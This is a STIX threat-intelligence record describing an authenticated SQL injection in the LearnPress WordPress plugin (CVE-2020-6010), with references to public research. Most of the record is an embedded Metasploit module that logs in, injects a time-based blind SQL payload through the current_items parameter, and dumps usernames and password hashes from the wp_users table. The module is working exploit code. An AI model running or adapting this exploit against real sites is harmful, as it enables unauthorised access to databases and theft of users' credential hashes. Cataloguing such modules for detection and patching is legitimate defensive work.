{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--27557cd8-38e1-4ec1-b9a0-05393a235e43",
    "created": "2024-08-14T16:31:04.464267Z",
    "modified": "2024-08-14T16:31:04.464271Z",
    "name": "Wordpress LearnPress current_items Authenticated SQLi",
    "description": " LearnPress, a learning management plugin for WordPress prior to 3.2.6.8 is affected by an authenticated SQL injection via the current_items parameter of the post-new.php page. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_learnpress_sqli.rb",
            "external_id": "wp_learnpress_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-6010"
        },
        {
            "source_name": "reference",
            "url": "https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/"
        },
        {
            "source_name": "WPVDB",
            "external_id": "10208"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress LearnPress current_items Authenticated SQLi',\n        'Description' => %q{\n          LearnPress, a learning management plugin for WordPress,\n          prior to 3.2.6.8 is affected by an authenticated SQL injection via the\n          current_items parameter of the post-new.php page.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Omri Herscovici', # Discovery and PoC\n          'Sagi Tzadik', # Discovery and PoC\n          'nhattruong' # edb poc\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-6010'],\n          ['URL', 'https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/'],\n          ['EDB', '50137'],\n          ['WPVDB', '10208']\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]\n        ],\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2020-04-29',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),\n      OptString.new('USERNAME', [true, 'Valid Username for login', '']),\n      OptString.new('PASSWORD', [true, 'Valid Password for login', ''])\n    ]\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      vprint_error('Server not online or not detected as wordpress')\n      return\n    end\n\n    checkcode = check_plugin_version_from_readme('learnpress', '3.2.6.8')\n    if checkcode == Msf::Exploit::CheckCode::Safe\n      vprint_error('LearnPress version not vulnerable')\n      return\n    end\n    print_good('Vulnerable version of LearnPress detected')\n\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    if cookie.nil?\n      vprint_error('Invalid login, check credentials')\n      return\n    end\n\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|\n      res = send_request_cgi({\n        'method' => 'POST',\n        'cookie' => cookie,\n        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'post-new.php'),\n        'vars_get' => {\n          'post_type' => 'lp_order'\n        },\n        'vars_post' => {\n          'type' => 'lp_course',\n          'context' => 'order-items',\n          'context_id' => Rex::Text.rand_text_numeric(2, 0), # avoid 0s incase leading 0 gives bad results\n          'term' => Rex::Text.rand_text_alpha(8),\n          'paged' => 1,\n          'lp-ajax' => 'modal_search_items',\n          'current_items[]' => \"1 AND (SELECT #{Rex::Text.rand_text_numeric(4, 0)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)})\"\n        }\n      })\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n\n    unless @sqli.test_vulnerable\n      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")\n      return\n    end\n    columns = ['user_login', 'user_pass']\n\n    print_status('Enumerating Usernames and Password Hashes')\n    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])\n\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    data.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-29"
}